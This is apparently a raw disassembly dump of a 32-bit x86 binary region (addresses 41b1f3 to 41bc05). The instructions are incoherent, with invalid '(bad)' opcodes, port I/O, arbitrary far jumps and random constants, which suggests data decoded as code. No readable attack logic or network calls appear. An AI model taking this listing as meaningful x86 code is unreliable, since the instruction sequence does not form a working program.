  41b1f3:	and    ah,bh
  41b1f5:	pop    ss
  41b1f6:	retf   
  41b1f7:	xchg   esp,eax
  41b1f8:	xlat   BYTE PTR ds:[ebx]
  41b1f9:	or     DWORD PTR [edx-0x78c47d31],0x373ea2b0
  41b203:	add    al,BYTE PTR [esi+ecx*1]
  41b206:	mov    edi,0xd65e6238
  41b20b:	in     eax,0x6e
  41b20d:	mov    ebx,0xfdcf2a8e
  41b212:	jbe    0x41b200
  41b214:	sub    ebx,0xffb76a0
  41b21a:	inc    esp
  41b21b:	rcr    DWORD PTR [ebx-0x18cc3ee0],0x4d
  41b222:	cmp    BYTE PTR [esi],al
  41b224:	mov    BYTE PTR [ebp-0xc],bh
  41b227:	sub    bh,ah
  41b229:	dec    esi
  41b22a:	repz repz adc ebx,DWORD PTR [edi-0x1f9cb562]
  41b232:	jbe    0x41b29c
  41b234:	repnz fnstsw WORD PTR [ebx+edx*2-0x60]
  41b239:	mov    edx,0x23b88558
  41b23e:	jl     0x41b212
  41b240:	push   ecx
  41b241:	cmp    DWORD PTR [edi+ecx*8+0x76e148bb],esp
  41b248:	pop    eax
  41b249:	dec    esi
  41b24a:	sbb    BYTE PTR [edx],dl
  41b24c:	inc    edi
  41b24d:	outs   dx,DWORD PTR ds:[esi]
  41b24e:	sti    
  41b24f:	mov    bh,0x85
  41b251:	fstp   TBYTE PTR [esi+0x32]
  41b254:	lods   eax,DWORD PTR ds:[esi]
  41b255:	dec    eax
  41b256:	pop    esp
  41b257:	sub    ah,BYTE PTR [esi+0x64]
  41b25a:	loop   0x41b260
  41b25c:	outs   dx,BYTE PTR ds:[esi]
  41b25d:	push   cs
  41b25e:	dec    edx
  41b25f:	and    edi,DWORD PTR [esi-0x1d3b755b]
  41b265:	xchg   BYTE PTR [edi+0x1c],al
  41b268:	add    eax,0x502571d
	...
  41b2d5:	add    BYTE PTR [esi+0x6be069a5],cl
  41b2db:	in     al,dx
  41b2dc:	(bad)  
  41b2dd:	out    dx,eax
  41b2de:	stos   BYTE PTR es:[edi],al
  41b2df:	jge    0x41b27c
  41b2e1:	or     BYTE PTR [ecx-0x59],bh
  41b2e4:	dec    ebp
  41b2e5:	dec    edi
  41b2e6:	sbb    ah,BYTE PTR [ecx+eax*1]
  41b2e9:	add    bh,bh
  41b2eb:	add    BYTE PTR [eax],al
  41b2ed:	add    BYTE PTR [ebx+0x710c15cc],al
  41b2f3:	pop    eax
  41b2f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2f5:	adc    dh,bh
  41b2f7:	inc    esi
  41b2f8:	add    al,0xa8
  41b2fa:	jl     0x41b295
  41b2fc:	js     0x41b293
  41b2fe:	sub    bl,BYTE PTR [ebx]
  41b300:	imul   ebx,DWORD PTR [ebx+0x65],0x1a
  41b304:	je     0x41b2ba
  41b306:	mov    ebp,0x10cfd1f7
  41b30b:	ja     0x41b313
  41b30d:	addr16 in al,dx
  41b30f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b310:	repz js 0x41b29e
  41b313:	or     BYTE PTR [ecx+0x29fadb6a],dh
  41b319:	pusha  
  41b31a:	mov    esp,0x19dd1083
  41b31f:	cld    
  41b320:	dec    eax
  41b321:	sub    ebp,DWORD PTR [ecx]
  41b323:	xchg   esp,eax
  41b324:	xchg   esp,eax
  41b325:	or     al,BYTE PTR [edi-0x1773149e]
  41b32b:	dec    esp
  41b32c:	out    dx,eax
  41b32d:	into   
  41b32e:	loope  0x41b37d
  41b330:	cld    
  41b331:	pop    edx
  41b332:	das    
  41b333:	mov    esi,0x39883bea
  41b338:	or     DWORD PTR [edx+edi*4-0x7f],ebx
  41b33c:	arpl   si,si
  41b33e:	test   al,0x7b
  41b340:	loope  0x41b345
  41b342:	sbb    edi,esp
  41b344:	add    al,BYTE PTR ds:0x86223a7c
  41b34a:	push   esp
  41b34b:	div    BYTE PTR [ebp-0x59f380a2]
  41b351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b352:	pusha  
  41b353:	inc    ecx
  41b354:	push   eax
  41b355:	fst    QWORD PTR [esi+0x71b3ce0f]
  41b35b:	mov    eax,0x210a2995
  41b360:	adc    al,0x2
  41b362:	stc    
  41b363:	test   al,0xb3
  41b365:	cdq    
  41b366:	in     al,dx
  41b367:	inc    ecx
  41b368:	cwde   
  41b369:	(bad)  
  41b36b:	(bad)  
  41b36c:	stos   BYTE PTR es:[edi],al
  41b36d:	addr16 pusha 
  41b36f:	sbb    dh,BYTE PTR ds:0x23cf020a
  41b375:	and    esi,edx
  41b377:	clc    
  41b378:	das    
  41b379:	mov    dh,0x9c
  41b37b:	gs jnp 0x41b3fd
  41b37e:	test   edx,esp
  41b380:	scas   al,BYTE PTR es:[edi]
  41b381:	or     DWORD PTR [esi-0x1d68cc29],ecx
  41b387:	fidivr WORD PTR [ecx-0x589f8c17]
  41b38d:	hlt    
  41b38e:	push   ss
  41b38f:	sub    al,0x6e
  41b391:	cwde   
  41b392:	push   ss
  41b393:	(bad)  
  41b394:	js     0x41b3b8
  41b396:	ja     0x41b3b7
  41b398:	test   al,0x92
  41b39a:	fisub  DWORD PTR [edx+eiz*8]
  41b39d:	xchg   BYTE PTR [ebx+0x4],al
  41b3a0:	gs mov eax,0x49d31452
  41b3a6:	jbe    0x41b414
  41b3a8:	call   0xdd2de596
  41b3ad:	das    
  41b3ae:	mov    ebx,0xa214d755
  41b3b3:	mov    al,BYTE PTR [ebx+0x1f]
  41b3b6:	mov    DWORD PTR [ecx+0x60fc7816],esi
  41b3bc:	mov    ah,bl
  41b3be:	hlt    
  41b3bf:	js     0x41b346
  41b3c1:	stc    
  41b3c2:	loope  0x41b377
  41b3c4:	dec    edi
  41b3c5:	jbe    0x41b431
  41b3c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3c8:	mov    esp,0xb48736ae
  41b3cd:	enter  0xb6ee,0xa7
  41b3d1:	jne    0x41b3f5
  41b3d3:	int    0x3d
  41b3d5:	aas    
  41b3d6:	adc    BYTE PTR [eax-0x75d5593a],al
  41b3dc:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3de:	stc    
  41b3df:	lea    esp,[edi+0x46b05699]
  41b3e5:	pusha  
  41b3e6:	add    BYTE PTR [edi+edi*2-0x2fc2992d],dh
	...
  41b455:	add    BYTE PTR [eax+0xd],cl
  41b458:	sbb    eax,0xfebb5dab
  41b45d:	out    dx,eax
  41b45e:	xchg   ebp,eax
  41b45f:	iret   
  41b460:	push   ebx
  41b461:	aas    
  41b462:	jg     0x41b440
  41b464:	ficomp WORD PTR [ecx+ebx*1+0x25]
  41b468:	add    DWORD PTR [eax],eax
  41b46a:	inc    DWORD PTR [eax]
  41b46c:	add    BYTE PTR [eax],al
  41b46e:	jo     0x41b3fa
  41b470:	cmp    eax,0xf78c3cff
  41b475:	mov    esp,0x47671350
  41b47a:	and    edi,ecx
  41b47c:	push   eax
  41b47d:	pop    esp
  41b47e:	jne    0x41b4fd
  41b480:	fucom  st(4)
  41b482:	enter  0xe2f8,0x5f
  41b486:	dec    eax
  41b487:	jae    0x41b46e
  41b489:	sbb    BYTE PTR [ebx+0x11],0x2d
  41b48d:	mov    BYTE PTR [eax+ebp*8],dh
  41b490:	pop    eax
  41b491:	(bad)
  41b494:	stos   DWORD PTR es:[edi],eax
  41b495:	shl    esi,0xb1
  41b498:	stc    
  41b499:	xor    BYTE PTR ds:0xb756ec71,al
  41b49f:	adc    DWORD PTR [ebx+esi*8-0x3],edx
  41b4a3:	data16 and bh,bh
  41b4a6:	std    
  41b4a7:	adc    eax,0xa4039022
  41b4ac:	into   
  41b4ad:	mov    dl,ah
  41b4af:	xor    edi,DWORD PTR [eax-0x7b]
  41b4b2:	jbe    0x41b501
  41b4b4:	mov    DWORD PTR [edx+edi*1+0x29],edx
  41b4b8:	cmp    al,0x39
  41b4ba:	jno    0x41b4c1
  41b4bc:	mov    edi,0x4cf1f10d
  41b4c1:	dec    ebx
  41b4c2:	push   esi
  41b4c3:	mov    ds:0x28b97efc,eax
  41b4c8:	xor    ecx,DWORD PTR [edi-0x2e953b81]
  41b4ce:	mul    BYTE PTR [eax+0x21e81c8f]
  41b4d4:	icebp  
  41b4d5:	adc    DWORD PTR [ecx],0xffffffaa
  41b4d8:	sub    eax,0x83793499
  41b4dd:	imul   eax,DWORD PTR [edi],0x63
  41b4e0:	mov    bl,BYTE PTR [edi+0x5a]
  41b4e3:	jp     0x41b532
  41b4e5:	jno    0x41b47b
  41b4e7:	mov    dl,0x9
  41b4e9:	and    bl,BYTE PTR [ebp+0x4ee2de46]
  41b4ef:	outs   dx,BYTE PTR ds:[esi]
  41b4f0:	xlat   BYTE PTR ds:[ebx]
  41b4f1:	fist   DWORD PTR [edx+edi*1-0x2ebb163c]
  41b4f8:	jns    0x41b56a
  41b4fa:	rol    DWORD PTR [ecx],0x0
  41b4fd:	fidivr WORD PTR [ebp-0x46]
  41b500:	mov    al,ds:0x9fc312ca
  41b505:	out    0x24,eax
  41b507:	cmp    al,0x87
  41b509:	das    
  41b50a:	mov    bl,0x4e
  41b50c:	out    dx,eax
  41b50d:	shl    esp,1
  41b50f:	or     al,0x38
  41b511:	outs   dx,BYTE PTR ds:[esi]
  41b512:	or     BYTE PTR [edx],al
  41b514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b515:	popf   
  41b516:	pop    ds
  41b517:	in     eax,0xdd
  41b519:	add    dh,BYTE PTR [edi+edi*2+0x36]
  41b51d:	(bad)  
  41b51e:	jg     0x41b4dd
  41b520:	pop    es
  41b521:	jmp    0x41b570
  41b523:	test   eax,0x2c9a6e0b
  41b528:	pop    ds
  41b529:	lds    ebx,FWORD PTR [ebx-0x5c]
  41b52c:	cmp    al,0x17
  41b52e:	popf   
  41b52f:	xor    bl,dh
  41b531:	or     ah,BYTE PTR [eax-0x6058cb52]
  41b537:	mov    edi,0xaa59bf42
  41b53c:	adc    al,0xda
  41b53e:	pop    edx
  41b53f:	push   esi
  41b540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b541:	sbb    DWORD PTR [ecx],0x23
  41b544:	sub    BYTE PTR [ebx],bh
  41b546:	test   BYTE PTR [eax],cl
  41b548:	pop    ds
  41b549:	mov    BYTE PTR [esi-0x2b9ac96],ch
  41b54f:	mov    dh,BYTE PTR ds:0xe27db25a
  41b555:	or     BYTE PTR [ebx],ch
  41b557:	fsubr  st(7),st
  41b559:	push   ss
  41b55a:	mov    WORD PTR [ecx],ss
  41b55c:	or     ecx,ebx
  41b55e:	cmp    ecx,DWORD PTR [ebx]
  41b560:	loop   0x41b560
  41b562:	out    0xc9,al
  41b564:	mov    WORD PTR [eax-0x28],ds
  41b567:	and    dh,BYTE PTR [edx+0x7d6ce10]
	...
  41b5d5:	add    ah,dl
  41b5d7:	in     al,dx
  41b5d8:	add    edi,edi
  41b5da:	cmp    edi,edi
  41b5dc:	(bad)  
  41b5dd:	out    dx,eax
  41b5de:	loope  0x41b5a6
  41b5e0:	jns    0x41b5c3
  41b5e2:	scas   eax,DWORD PTR es:[edi]
  41b5e3:	and    BYTE PTR [eax],ah
  41b5e5:	adc    al,0x18
  41b5e7:	add    DWORD PTR es:[eax],eax
  41b5ea:	inc    DWORD PTR [eax]
  41b5ec:	add    BYTE PTR [eax],al
  41b5ee:	mov    cl,0x8e
  41b5f0:	mov    esp,0xf90d0093
  41b5f5:	adc    DWORD PTR [ebp-0x865cbd5],ecx
  41b5fb:	sbb    DWORD PTR [ebx+0x4c73620d],esp
  41b601:	test   BYTE PTR [edx-0x59],bh
  41b604:	xor    eax,0xbe338dd1
  41b609:	div    ebp
  41b60b:	outs   dx,BYTE PTR ds:[esi]
  41b60c:	mov    eax,0x337b55cf
  41b611:	retf   0x9662
  41b614:	loopne 0x41b5c7
  41b616:	mov    eax,0xa56d1687
  41b61b:	outs   dx,DWORD PTR ds:[esi]
  41b61c:	xchg   esp,eax
  41b61d:	fisubr WORD PTR [ecx+0x1aecdcf9]
  41b623:	lods   eax,DWORD PTR ds:[esi]
  41b624:	sbb    DWORD PTR [eax-0x67],esi
  41b627:	dec    esp
  41b628:	leave  
  41b629:	pop    ebp
  41b62a:	or     edx,DWORD PTR [eax-0x18]
  41b62d:	xor    eax,0x4881452c
  41b632:	mov    dh,0x2c
  41b634:	xlat   BYTE PTR ds:[ebx]
  41b635:	cwde   
  41b636:	les    ecx,FWORD PTR [ebx-0x796c074b]
  41b63c:	arpl   bp,sp
  41b63e:	leave  
  41b63f:	cli    
  41b640:	das    
  41b641:	repnz jmp 0x298:0x826b3c47
  41b649:	jp     0x41b680
  41b64b:	retf   0xa112
  41b64e:	jno    0x41b69a
  41b650:	push   cs
  41b651:	xor    bh,BYTE PTR [ebx+0x19]
  41b654:	retf   
  41b655:	cmp    BYTE PTR [esi-0x39],0x80
  41b659:	or     eax,0xad57d85a
  41b65e:	dec    esi
  41b65f:	inc    edi
  41b660:	int    0xd4
  41b662:	or     BYTE PTR [eax+0x24],cl
  41b665:	popf   
  41b666:	mov    WORD PTR [ecx-0x61dc83dd],cs
  41b66c:	jns    0x41b661
  41b66e:	jne    0x41b680
  41b670:	dec    ebx
  41b671:	outs   dx,DWORD PTR ds:[esi]
  41b672:	inc    ebx
  41b673:	or     al,0x2b
  41b675:	lods   eax,DWORD PTR ds:[esi]
  41b676:	cld    
  41b677:	repz fidiv DWORD PTR ds:0xf511021e
  41b67e:	je     0x41b667
  41b680:	(bad)
  41b683:	ret    0x95e4
  41b686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b687:	out    dx,eax
  41b688:	jbe    0x41b701
  41b68a:	sbb    al,0xf0
  41b68c:	retf   
  41b68d:	stos   BYTE PTR es:[edi],al
  41b68e:	sti    
  41b68f:	xchg   ebx,eax
  41b690:	fs add eax,0x18fc3be5
  41b696:	retf   
  41b697:	mov    WORD PTR [ebx],?
  41b699:	cmovge ecx,DWORD PTR [ecx-0x735ecf7]
  41b6a0:	pop    esp
  41b6a1:	sahf   
  41b6a2:	xchg   ebx,eax
  41b6a3:	sbb    al,ah
  41b6a5:	jno    0x41b64f
  41b6a7:	popf   
  41b6a8:	push   esi
  41b6a9:	push   esi
  41b6aa:	pop    eax
  41b6ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6ac:	inc    esi
  41b6ad:	push   es
  41b6ae:	bound  esi,QWORD PTR [edi+ebx*8]
  41b6b1:	fmul   QWORD PTR [ecx-0x7d097b51]
  41b6b7:	mov    al,ds:0x56389941
  41b6bc:	jne    0x41b678
  41b6be:	mov    cl,0xec
  41b6c0:	push   eax
  41b6c1:	add    al,0xc0
  41b6c3:	lds    edi,FWORD PTR [edx]
  41b6c5:	aaa    
  41b6c6:	pop    ecx
  41b6c7:	mov    al,BYTE PTR [edx+0x899af94]
  41b6cd:	popf   
  41b6ce:	inc    eax
  41b6cf:	popa   
  41b6d0:	adc    al,0x6f
  41b6d2:	xor    edi,DWORD PTR [edx+0x336c80ab]
  41b6d8:	cmp    ah,BYTE PTR [ebx]
  41b6da:	in     eax,0x91
  41b6dc:	pusha  
  41b6dd:	jecxz  0x41b6b7
  41b6df:	loope  0x41b6f1
  41b6e1:	lock xor al,0xf1
  41b6e4:	std    
  41b6e5:	cmp    BYTE PTR [eax-0xfd9c5d6],al
  41b6eb:	jge    0x41b733
	...
  41b755:	add    BYTE PTR [eax-0x2469e49d],ch
  41b75b:	(bad)  
  41b75c:	lods   eax,DWORD PTR ds:[esi]
  41b75d:	jg     0x41b75a
  41b75f:	push   ds
  41b760:	mov    ah,dh
  41b762:	ror    BYTE PTR [edi],cl
  41b764:	es stc 
  41b766:	pop    ss
  41b767:	daa    
  41b768:	add    DWORD PTR [eax],eax
  41b76a:	inc    DWORD PTR [eax]
  41b76c:	add    BYTE PTR [eax],al
  41b76e:	aaa    
  41b76f:	mov    ah,0x10
  41b771:	dec    ebp
  41b772:	pop    ds
  41b773:	adc    eax,0x84082cd1
  41b778:	or     edx,DWORD PTR ds:0x646dc640
  41b77e:	jne    0x41b756
  41b780:	mov    edi,0x4a76ec6f
  41b785:	int    0xf
  41b787:	xchg   edx,eax
  41b788:	pop    esp
  41b789:	adc    eax,0x9ab05ae5
  41b78e:	sub    eax,0xde5fcccc
  41b793:	dec    eax
  41b794:	push   ds
  41b795:	stc    
  41b796:	dec    ecx
  41b797:	popa   
  41b798:	(bad)  
  41b799:	push   ebx
  41b79a:	xchg   ebx,eax
  41b79b:	clc    
  41b79c:	call   0x57b8:0xa5acf8c8
  41b7a3:	test   al,0x5f
  41b7a5:	nop
  41b7a6:	dec    ebp
  41b7a7:	es xchg edi,eax
  41b7a9:	dec    ebx
  41b7aa:	pop    esp
  41b7ab:	or     esp,DWORD PTR [ecx+0x6401830a]
  41b7b1:	ret    
  41b7b2:	mov    ecx,DWORD PTR [edi]
  41b7b4:	inc    ebp
  41b7b5:	and    eax,0xab7138cc
  41b7ba:	aas    
  41b7bb:	mov    esi,edx
  41b7bd:	dec    ebp
  41b7be:	pop    esp
  41b7bf:	les    esi,FWORD PTR [esi]
  41b7c1:	inc    ebx
  41b7c2:	imul   eax,DWORD PTR [ecx+0x68],0x5f669a2
  41b7c9:	jo     0x41b7b0
  41b7cb:	jecxz  0x41b81a
  41b7cd:	test   BYTE PTR [edi],bl
  41b7cf:	or     eax,0x49787d9c
  41b7d4:	clc    
  41b7d5:	mov    eax,0xe2bc1901
  41b7da:	jno    0x41b847
  41b7dc:	scas   eax,DWORD PTR es:[edi]
  41b7dd:	push   eax
  41b7de:	fistp  WORD PTR [ebp+0x7c1200ed]
  41b7e4:	pop    ds
  41b7e5:	dec    edi
  41b7e6:	sub    BYTE PTR [edx],bh
  41b7e8:	add    eax,0xb58bf201
  41b7ed:	push   eax
  41b7ee:	loope  0x41b857
  41b7f0:	xchg   esi,eax
  41b7f1:	push   ebp
  41b7f2:	mov    ah,0xe3
  41b7f4:	(bad)  
  41b7f5:	bound  ecx,QWORD PTR [edx+0x24407fde]
  41b7fb:	hlt    
  41b7fc:	sti    
  41b7fd:	lea    ecx,[ecx*2-0x629e0dea]
  41b804:	push   0xffffff9c
  41b806:	push   eax
  41b807:	xor    al,0xa9
  41b809:	aam    0xab
  41b80b:	push   0xb1e6eca0
  41b810:	mov    esp,DWORD PTR [edx+0x27735d96]
  41b816:	xchg   edi,eax
  41b817:	push   esi
  41b818:	inc    ecx
  41b819:	add    cl,BYTE PTR [eax]
  41b81b:	push   ss
  41b81c:	sbb    DWORD PTR [ebx],ecx
  41b81e:	push   es
  41b81f:	dec    ebp
  41b820:	sub    ebp,DWORD PTR [eax]
  41b822:	outs   dx,BYTE PTR ds:[esi]
  41b823:	fist   DWORD PTR [esi]
  41b825:	push   cs
  41b826:	jecxz  0x41b886
  41b828:	rol    DWORD PTR [esi],1
  41b82a:	imul   edi,DWORD PTR [eax+eax*8-0xca36280],0x6c
  41b832:	shl    DWORD PTR [ecx-0xa],cl
  41b835:	retf   0xd2ea
  41b838:	imul   esi,DWORD PTR [eax-0x7a5b19c7],0xffffff93
  41b83f:	int3   
  41b840:	lods   al,BYTE PTR ds:[esi]
  41b841:	cmp    al,0x3e
  41b843:	mov    edx,0xa9b355b3
  41b848:	loopne 0x41b856
  41b84a:	stos   BYTE PTR es:[edi],al
  41b84b:	sub    eax,0x6e50ae7f
  41b850:	cmp    al,0xb8
  41b852:	fwait
  41b853:	in     al,0xdc
  41b855:	jbe    0x41b836
  41b857:	jnp    0x41b815
  41b859:	stc    
  41b85a:	pusha  
  41b85b:	outs   dx,BYTE PTR ds:[esi]
  41b85c:	adc    ebx,eax
  41b85e:	fs pop ecx
  41b860:	outs   dx,DWORD PTR ds:[esi]
  41b861:	inc    ecx
  41b862:	fidivr DWORD PTR [eax+0x7157c873]
  41b868:	fisttp DWORD PTR [ecx]
  41b86a:	mov    esp,0x95f5
	...
  41b8d3:	add    BYTE PTR [eax],al
  41b8d5:	add    BYTE PTR [edx-0x8b13804],cl
  41b8db:	jg     0x41b868
  41b8dd:	cld    
  41b8de:	ret    0x78e3
  41b8e1:	add    al,0xc5
  41b8e3:	push   ebx
  41b8e4:	adc    BYTE PTR [ebx],dl
  41b8e6:	push   ss
  41b8e7:	sub    BYTE PTR [ecx],al
  41b8e9:	add    bh,bh
  41b8eb:	add    BYTE PTR [eax],al
  41b8ed:	add    BYTE PTR [edx],ah
  41b8ef:	lea    edi,[esp+edx*2-0x1ce2ba97]
  41b8f6:	jp     0x41b883
  41b8f8:	jl     0x41b8b8
  41b8fa:	adc    DWORD PTR [eax+0x60],edx
  41b8fd:	int    0xae
  41b8ff:	(bad)  
  41b900:	retf   
  41b901:	push   0xffffffec
  41b903:	das    
  41b904:	fisttp QWORD PTR [esi-0x21]
  41b907:	stos   BYTE PTR es:[edi],al
  41b908:	loop   0x41b976
  41b90a:	in     eax,dx
  41b90b:	ret    
  41b90c:	rcr    ebp,1
  41b90e:	pop    es
  41b90f:	fsubr  DWORD PTR [edx]
  41b911:	adc    bl,dl
  41b913:	enter  0xd2c3,0xd4
  41b917:	add    BYTE PTR [esi-0x634748dc],ah
  41b91d:	ret    0x3dec
  41b920:	push   0x60
  41b922:	(bad)  
  41b923:	mov    al,ds:0x460aa287
  41b928:	in     eax,0xcc
  41b92a:	fs dec ecx
  41b92c:	mov    ds:0x8c09f15a,eax
  41b931:	or     edi,DWORD PTR [ecx+0x2b]
  41b934:	push   ebx
  41b935:	sar    bl,0x55
  41b938:	fldenv [eax]
  41b93a:	xchg   esi,eax
  41b93b:	push   eax
  41b93c:	xor    al,0xe0
  41b93e:	sbb    bh,BYTE PTR [edx-0x381e564a]
  41b944:	sbb    DWORD PTR [ebx+eiz*1+0x6b48ed5c],0x7d9f2a38
  41b94f:	mov    ch,0x69
  41b951:	dec    esi
  41b952:	scas   al,BYTE PTR es:[edi]
  41b953:	out    0xbf,al
  41b955:	fidiv  DWORD PTR [eax+0x49]
  41b958:	sub    eax,0x9d859fbe
  41b95d:	imul   ecx,ecx,0x39
  41b960:	inc    ebp
  41b961:	(bad)  
  41b963:	or     esi,DWORD PTR [ebx+0x283855bd]
  41b969:	xlat   BYTE PTR ds:[ebx]
  41b96a:	adc    esi,esi
  41b96c:	adc    ebx,DWORD PTR [edi]
  41b96e:	inc    ecx
  41b96f:	push   ecx
  41b970:	xor    esp,DWORD PTR [edx+0x64428f28]
  41b976:	sbb    BYTE PTR [edx],ah
  41b978:	sub    eax,0x6368d5c
  41b97d:	push   ss
  41b97e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b97f:	sbb    DWORD PTR [edx-0xf],0xffffffd2
  41b983:	xchg   edi,eax
  41b984:	fwait
  41b985:	jl     0x41b961
  41b987:	scas   eax,DWORD PTR es:[edi]
  41b988:	div    BYTE PTR [eax]
  41b98a:	std    
  41b98b:	push   ecx
  41b98c:	dec    edi
  41b98d:	inc    edx
  41b98e:	mov    dl,0xa0
  41b990:	popa   
  41b991:	fcom   DWORD PTR [ebx]
  41b993:	jmp    0x41b9a6
  41b995:	aam    0x97
  41b997:	inc    edi
  41b998:	jbe    0x41b9d0
  41b99a:	xchg   BYTE PTR [edi+esi*1],bl
  41b99d:	imul   eax,DWORD PTR ds:0x2708c3f1,0xc533ac6e
  41b9a7:	push   0xffffffba
  41b9a9:	in     eax,0xa5
  41b9ab:	inc    esp
  41b9ac:	fdiv   st,st(6)
  41b9ae:	loope  0x41b937
  41b9b0:	nop
  41b9b1:	mov    edx,0x113dce1
  41b9b6:	leave  
  41b9b7:	mov    al,ds:0xc99a312
  41b9bc:	push   ebx
  41b9bd:	idiv   ecx
  41b9bf:	xor    DWORD PTR [esi],0xffffffac
  41b9c2:	loopne 0x41ba1f
  41b9c4:	adc    DWORD PTR [ecx],esp
  41b9c6:	and    bh,BYTE PTR [esp+esi*2]
  41b9c9:	ins    BYTE PTR es:[edi],dx
  41b9ca:	ret    
  41b9cb:	cmp    DWORD PTR [esi+0x42a73dca],eax
  41b9d1:	xchg   BYTE PTR [esi],dl
  41b9d3:	cld    
  41b9d4:	pop    esp
  41b9d5:	fsub   DWORD PTR [ebp-0x321ebc70]
  41b9db:	dec    eax
  41b9dc:	dec    edx
  41b9dd:	test   BYTE PTR [edi+0x3bc68064],bh
  41b9e3:	(bad)  
  41b9e5:	test   ebp,edx
  41b9e7:	(bad)  
  41b9e8:	scas   eax,DWORD PTR es:[edi]
  41b9e9:	(bad)  
  41b9ea:	sti    
  41b9eb:	scas   al,BYTE PTR es:[edi]
  41b9ec:	dec    ebp
	...
  41ba55:	add    bl,al
  41ba57:	mov    esp,0xf87f4844
  41ba5c:	iret   
  41ba5d:	mov    edi,0x8c8b3b8c
  41ba62:	inc    edi
  41ba63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba64:	sub    bh,BYTE PTR [edi]
  41ba66:	adc    eax,0xff000129
  41ba6b:	add    BYTE PTR [eax],al
  41ba6d:	add    BYTE PTR [ebp-0x2114e2e8],ah
  41ba73:	fucomp st(7)
  41ba75:	ja     0x41ba6e
  41ba77:	add    ch,BYTE PTR [edi-0x5c]
  41ba7a:	aaa    
  41ba7b:	out    0x9b,eax
  41ba7d:	scas   al,BYTE PTR es:[edi]
  41ba7e:	push   edx
  41ba7f:	jo     0x41ba65
  41ba81:	xchg   edi,eax
  41ba82:	pop    ss
  41ba83:	or     DWORD PTR [edx+edx*4-0x7f],eax
  41ba87:	les    esp,FWORD PTR es:[esi]
  41ba8a:	shl    BYTE PTR [eax+0x72],0xa9
  41ba8e:	cmp    al,0x9c
  41ba90:	cmp    al,BYTE PTR [eax]
  41ba92:	daa    
  41ba93:	fsubr  st(0),st
  41ba95:	adc    DWORD PTR [ecx-0x221acef7],esp
  41ba9b:	push   eax
  41ba9c:	dec    edi
  41ba9d:	cli    
  41ba9e:	jb     0x41ba28
  41baa0:	push   esp
  41baa1:	rcl    DWORD PTR [ecx+0x2f],cl
  41baa4:	mov    al,0x2f
  41baa6:	sub    al,bl
  41baa8:	push   esp
  41baa9:	nop
  41baaa:	cmp    dh,BYTE PTR [ebp+0x309570a]
  41bab0:	push   0xdc8a3da7
  41bab5:	repnz mov ds:0x128a4b86,eax
  41babb:	jne    0x41ba43
  41babd:	out    0x47,al
  41babf:	sbb    dh,al
  41bac1:	cmp    esi,ebp
  41bac3:	jmp    0x41bb06
  41bac5:	sbb    DWORD PTR [ebp+0x2b],edi
  41bac8:	mov    DWORD PTR [ecx+edx*8+0x1cfc788b],edi
  41bacf:	int    0xe0
  41bad1:	call   0xf95eb7f2
  41bad6:	mov    WORD PTR [esi],?
  41bad8:	inc    ebx
  41bad9:	mov    edi,0x4778c5fa
  41bade:	popf   
  41badf:	sub    al,bh
  41bae1:	ret    0x8ee3
  41bae4:	nop
  41bae5:	scas   eax,DWORD PTR es:[edi]
  41bae6:	ja     0x41bade
  41bae8:	mov    ds:0xf5146af6,eax
  41baed:	div    DWORD PTR [esi+ecx*8-0x5c1b29cf]
  41baf4:	push   es
  41baf5:	mov    BYTE PTR [esi+0x537a3637],cl
  41bafb:	xor    ecx,DWORD PTR [edi]
  41bafd:	aaa    
  41bafe:	adc    cl,BYTE PTR [edx]
  41bb00:	push   0x95ae7cfd
  41bb05:	xor    eax,0xa8fd18c0
  41bb0a:	push   0xd320a7a
  41bb0f:	dec    ebp
  41bb10:	and    DWORD PTR [esi+0x4e],0xffffffa5
  41bb14:	push   0x3b
  41bb16:	scas   eax,DWORD PTR es:[edi]
  41bb17:	and    esi,DWORD PTR [ecx+0x5356566e]
  41bb1d:	dec    edx
  41bb1e:	push   edi
  41bb1f:	cmp    ebx,edx
  41bb21:	jge    0x41bb9f
  41bb23:	out    dx,al
  41bb24:	fbld   TBYTE PTR [edi+esi*8]
  41bb27:	add    bl,cl
  41bb29:	push   ecx
  41bb2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb2b:	(bad)  [eax-0x3241a658]
  41bb32:	cmp    BYTE PTR [ebx],ah
  41bb34:	out    0xb,eax
  41bb36:	cli    
  41bb37:	lock lahf 
  41bb39:	adc    al,0x98
  41bb3b:	add    al,0x38
  41bb3d:	hlt    
  41bb3e:	pop    ds
  41bb3f:	jns    0x41bbbb
  41bb41:	sbb    eax,0xa2f29cf5
  41bb46:	loop   0x41bb95
  41bb48:	stc    
  41bb49:	jae    0x41bb2e
  41bb4b:	dec    ebp
  41bb4c:	call   0x8313:0x85231d35
  41bb53:	xchg   ebp,eax
  41bb54:	mov    ecx,0x2c957239
  41bb59:	and    ebx,DWORD PTR [eax+0x78840cd9]
  41bb5f:	sti    
  41bb60:	pop    edx
  41bb61:	adc    BYTE PTR [ebx+0x7af3d51c],bl
  41bb67:	addr16 neg ebx
  41bb6a:	jns    0x41bb40
  41bb6c:	rol    BYTE PTR [eax],0x0
	...
  41bbd3:	add    BYTE PTR [eax],al
  41bbd5:	add    BYTE PTR [edx],cl
  41bbd7:	mov    eax,0xbfb7aaa5
  41bbdc:	(bad)  
  41bbde:	jg     0x41bbe5
  41bbe0:	arpl   WORD PTR [edi+0xd],cx
  41bbe3:	mov    esp,0x2a141c7c
  41bbe8:	add    DWORD PTR [eax],eax
  41bbea:	inc    DWORD PTR [eax]
  41bbec:	add    BYTE PTR [eax],al
  41bbee:	ret    
  41bbef:	call   0xc3b0:0x2623df68
  41bbf6:	dec    ecx
  41bbf7:	push   ds
  41bbf8:	inc    edi
  41bbf9:	jmp    0xfd8c:0xe47f614e
  41bc00:	or     DWORD PTR [ebp+0x4a],esp
  41bc03:	or     BYTE PTR [ebx],ah
  41bc05:	pop    ebx
